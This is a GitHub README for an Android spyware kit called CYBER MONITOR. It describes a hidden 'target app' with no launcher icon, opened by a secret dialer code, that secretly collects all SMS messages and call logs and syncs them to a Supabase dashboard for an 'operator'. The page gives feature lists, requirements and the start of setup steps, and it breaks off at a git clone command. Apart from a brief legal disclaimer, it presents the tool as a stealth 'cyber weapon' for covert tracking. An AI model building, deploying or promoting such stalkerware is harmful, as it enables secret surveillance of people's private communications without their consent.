<!-- Glowing Top Border -->
<p align="center">
  <img src="https://i.imgur.com/dBaSKWF.gif" height="40" width="100%">
</p>

<div align="center">

<strong style="color:#ff0000; font-size: 2em;">🔴 CYBER MONITOR – Stealth Target Tracking 🔴</strong>
<br>
<a href="https://git.io/typing-svg">
  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=40&pause=1000&color=ff0000&center=true&width=800&height=80&lines=Stealth+Target+Tracking;SMS+%26+Call+Logs+Collector;Supabase+Realtime;MR-AUTHOR+Cyber+Weapon" alt="Typing SVG"/>
</a>

<p align="center">
  <img style="width: 280px; height: 280px; border-radius: 20px; box-shadow: 0 0 30px #ff0000, 0 0 50px rgba(255, 0, 0, 0.5);" src="file_00000000339c71fd897e55b6a45eb0b2.png" alt="MR-AUTHOR Cyber Monitor Icon" />
</p>

<p align="center" style="color: #ff0000; text-shadow: 0 0 5px #ff0000;">
  <i>"Silence is the best weapon. Hakuna anayejua, ila mimi."</i>
</p>

<br>

**🚀 DEPLOY DASHBOARD**
<br>
<a href="#" target="_blank">
  <img src="https://img.shields.io/badge/DEPLOY%20DASHBOARD-100000?style=for-the-badge&logo=netlify&logoColor=white&labelColor=darkred&color=darkred" alt="Deploy Dashboard"/>
</a>

<br>

**📱 GET TARGET APK**
<br>
<a href="#" target="_blank">
  <img src="https://img.shields.io/badge/BUILD%20APK-100000?style=for-the-badge&logo=android&logoColor=white&labelColor=darkred&color=darkred" alt="Build APK"/>
</a>

<br>

**📦 DOWNLOAD SOURCE ZIP**
<br>
<a href="https://github.com/omari143/SPYZONE/archive/refs/heads/main.zip" target="_blank">
  <img src="https://img.shields.io/badge/DOWNLOAD%20ZIP-100000?style=for-the-badge&logo=github&logoColor=white&labelColor=darkred&color=darkred" alt="Download zip"/>
</a>

<br>

![GitHub stars](https://img.shields.io/badge/stars-★★★★★-darkred?style=for-the-badge)
![GitHub forks](https://img.shields.io/badge/forks-CLASSIFIED-darkred?style=for-the-badge)
![GitHub repo size](https://img.shields.io/badge/size-2.3MB-darkred?style=for-the-badge)

</div>

---

## What is CYBER MONITOR?

**CYBER MONITOR** is a **stealth target tracking system** built by **MR-AUTHOR**. It consists of two main components:

1. **Target App (Android)** – Installed on the target device. It runs in **stealth mode** (no icon, hidden from launcher). Collects **all incoming/outgoing SMS messages** and **call logs** (caller, duration, timestamp) in real time, then syncs them to a **Supabase** database.

2. **Dashboard** – A web interface (HTML/JS) that allows the operator to **sign up / log in** and view the collected data in real time. Supports filtering, searching, and exporting to CSV.

> ⚠️ **For educational & authorized use only.** Unauthorized surveillance is illegal in most countries.

---

## 📸 Screenshots (Dashboard Preview)

<p align="center">
  <img src="IMG-20260414-WA0009.jpg" alt="SMS Logs" width="280" style="border-radius: 10px; box-shadow: 0 0 15px red;"/>
  &nbsp;
  <img src="IMG-20260414-WA0010.jpg" alt="Call Logs" width="280" style="border-radius: 10px; box-shadow: 0 0 15px red;"/>
</p>

> *Make sure the images `IMG-20260414-WA0009.jpg` and `IMG-20260414-WA0010.jpg` are in the same folder as this README (or adjust the path).*

---

## ✨ Features

- **Stealth Android Agent** – No app icon, invisible in recent apps, triggered by secret dialer code `*#12345#`.
- **SMS Collection** – Captures sender, message body, timestamp, and message type (sent/received).
- **Call Log Collection** – Captures phone number, call type (incoming/outgoing/missed), duration, and timestamp.
- **Supabase Backend** – Real-time database with row-level security (RLS). Each user has isolated data.
- **Web Dashboard** – Modern, responsive interface with authentication (signup/login), live updates via Supabase subscriptions, search/filter, and CSV export.
- **Secure** – Passwords hashed, API keys restricted, environment variables hidden.
- **Easy Deployment** – Dashboard can be hosted on Netlify, Vercel, or any static server. Target app built with Capacitor.

---

## ⚙️ Requirements

### For Target App (APK Building)
- Node.js (v18+)
- Android Studio (with SDK, NDK)
- Capacitor CLI
- Supabase account (free tier works)

### For Dashboard
- Any modern web browser (Chrome, Firefox, Edge)
- Supabase project (same as above)

---

## 🚀 Installation & Setup

### 1. Clone the repository
```bash
git clone https://github.com/omari143/SPYZONE.git
cd SPYZONE
